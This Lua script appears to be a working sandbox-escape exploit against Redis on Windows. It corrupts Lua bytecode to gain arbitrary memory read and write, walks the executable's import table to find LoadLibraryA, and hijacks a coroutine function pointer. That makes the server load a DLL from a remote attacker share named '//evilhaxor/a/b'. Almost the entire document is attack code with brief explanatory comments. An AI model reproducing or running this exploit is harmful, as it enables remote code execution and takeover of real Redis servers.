asnum = loadstring((string.dump(function(x)
	for i = x, x, 0 do
		return i
	end
end):gsub("\96%z%z\128", "\22\0\0\128")))

function double_to_dwords(x)
	if x == 0 then return 0, 0 end
	if x < 0 then x = -x end

	local m, e = math.frexp(x)

	if e + 1023 <= 1 then
		m = m * 2^(e + 1074)
		e = 0
	else
		m = (m - 0.5) * 2^53
		e = e + 1022
	end

	local lo = m % 2^32
	m = (m - lo) / 2^32
	local hi = m + e * 2^20
	
	return lo, hi
end

function dwords_to_double(lo, hi)
	local m = hi % 2^20
    local e = (hi - m) / 2^20
    m = m * 2^32 + lo

    if e ~= 0 then
		m = m + 2^52
    else
		e = 1
    end
    return m * 2^(e-1075)
end
			
function dword_to_string(x)
	local b0 = x % 256; x = (x - b0) / 256
	local b1 = x % 256; x = (x - b1) / 256
	local b2 = x % 256; x = (x - b2) / 256
	local b3 = x % 256
	
	return string.char(b0, b1, b2, b3)
end

function qword_to_string(x)
	local lo, hi = double_to_dwords(x)
	return dword_to_string(lo) .. dword_to_string(hi)
end

function add_dword_to_double(x, n)
	local lo, hi = double_to_dwords(x)
	return dwords_to_double(lo + n, hi)
end

function hd(s)
	local h = ""
	for i=1,s:len() do
		h = h .. string.format('%02X ', s:byte(i))
	end
	return h;
end

function band(a, b)
    local p, c=1, 0
    while a > 0 and b > 0 do
        local ra, rb = a % 2, b % 2
        if ra + rb > 1 then c = c + p end
        a, b, p = (a - ra) / 2, (b - rb) / 2, p * 2
    end
	
    return c
end

f = loadstring(string.dump(function()
	local magic = nil
	local function middle()
		local print = print
		local asnum = asnum
		local add_dword_to_double = add_dword_to_double
		local dwords_to_double = dwords_to_double
		local qword_to_string = qword_to_string
		local double_to_dwords = double_to_dwords
		local band = band
		local substr = string.sub
		local hd = hd
		local co = coroutine.wrap(function() end)
		local upval

		-- some constants (we can't use literals after messing with the bytecode)
		local n0 = 0
		local n1 = 1
		local n2 = 2
		local n4 = 4
		local n8 = 8
		local n12 = 12
		local n16 = 16
		local n20 = 20
		local n32 = 32
		local hff = 0xff000000
		local h3c = 0x3c -- offset to e_lfanew in DOS header
		local h90 = 0x90 -- offset to Import Directory in NT header
		local kernel32 = "KERNEL32"
		local loadlibrary1, loadlibrary2 = "LoadLibr", "aryA"
		
		-- declare some variables
		local luastate1_bkp
		local luastate2_bkp
		local i
		local lo, hi
		local base
		local ntheader
		local importdir
		local dllname
		local importname
		local loadlibrary
		local ft, oft
		local offset
	
		local function put_into_magic(n)
			-- hand-craft an UpVal
			upval = "nextnexttmpaddpa" .. qword_to_string(n)
			
			-- get the pointer to our hand-crafted UpVal
			local upval_ptr = qword_to_string(add_dword_to_double(asnum(upval), 24))

			magic = upval_ptr .. upval_ptr .. upval_ptr
		end
		
		-- get the address of current "lua_State"
		local luastate1 = asnum(coroutine.running())
		local luastate2 = add_dword_to_double(luastate1, 8)
		
		-- 5c5c6576 696c6861 786f725c 615c6200: DLL path string ("//evilhaxor/a/b")
		local path1 = dwords_to_double(0x76655c5c, 0x61686c69)
		local path2 = dwords_to_double(0x5c726f78, 0x00625c61)

		-- put luaB_auxwrap's address into "magic"
		put_into_magic(add_dword_to_double(asnum(co), n32))

		-- get RVA to NT header (base address + 3c)
		lo, hi = double_to_dwords(asnum(magic))
		base = dwords_to_double(band(lo, hff), hi)
		put_into_magic(add_dword_to_double(base, h3c))
		
		-- get RVA of Import Directory
		lo, hi = double_to_dwords(asnum(magic))
		add_dword_to_double(base, lo + h90)
		put_into_magic(add_dword_to_double(base, lo + h90))
		
		-- get real address of Import Directory
		lo, hi = double_to_dwords(asnum(magic))
		importdir = add_dword_to_double(base, lo)

		-- search for KERNEL32.dll
		while true do
			put_into_magic(add_dword_to_double(importdir, n12))
			lo, hi = double_to_dwords(asnum(magic))
			
			put_into_magic(add_dword_to_double(base, lo))
			dllname = qword_to_string(asnum(magic))
			
			if dllname == kernel32 then
			
				-- get First Thunk pointer
				put_into_magic(add_dword_to_double(importdir, n16))
				lo, hi = double_to_dwords(asnum(magic))
				ft = add_dword_to_double(base, lo)
			
				-- get Original First Thunk pointer
				put_into_magic(importdir)
				lo, hi = double_to_dwords(asnum(magic))
				oft = add_dword_to_double(base, lo)
				
				-- find LoadLibraryA's offset in original thunk table
				--
				-- note: the while loop is not really necessery, since
				--       in every Redis executable I've seen, KERNEL32
				--       is the first imported library.
				i = n0
				while true do
					-- get import name from OFT
					put_into_magic(add_dword_to_double(oft, i))
					lo, hi = double_to_dwords(asnum(magic))
					put_into_magic(add_dword_to_double(base, lo + n2))
					importname = qword_to_string(asnum(magic))
					
					-- if we've found LoadLibraryA, get its address from FT (aka IAT)
					if importname == loadlibrary1 then
					
						-- we can read only 8 bytes at a time, so we need to read
						-- further to be sure we've found LoadLibraryA, not one of
						-- the other LoadLibrary*'s (e.g. LoadLibraryExW)
						put_into_magic(add_dword_to_double(base, lo + n2 + n8))
						importname = qword_to_string(asnum(magic))
						if substr(importname, n1, n4) == loadlibrary2 then
							-- we've found LoadLibraryA, dereference it's real
							-- address from the IAT entry
							put_into_magic(add_dword_to_double(ft, i))
							loadlibrary = asnum(magic)
							break
						end
					end
					
					i = i + n8
				end
				
				break
			else importdir = add_dword_to_double(importdir, n20) end
			
		end
		
		-- save the first 16 bytes of the current lua_State, and overwrite it
		-- with our payload path ("//evilhaxor/a/b")
		put_into_magic(luastate1)
		luastate1_bkp = magic
		magic = path1
		put_into_magic(luastate2)
		luastate2_bkp = magic
		magic = path2
		
		-- put luaB_auxwrap's address into "magic"
		put_into_magic(add_dword_to_double(asnum(co), n32))
		
		-- replace co's function pointer to LoadLibrary
		magic = loadlibrary
		co()
		
		-- restore original lua_State
		put_into_magic(luastate1)
		magic = luastate1_bkp
		put_into_magic(luastate2)
		magic = luastate2_bkp
	end
	middle()
end):gsub("(\100%z%z%z)....", "%1\0\0\0\1", 1))

collectgarbage "stop"
debug.sethook()
coroutine.wrap(f)()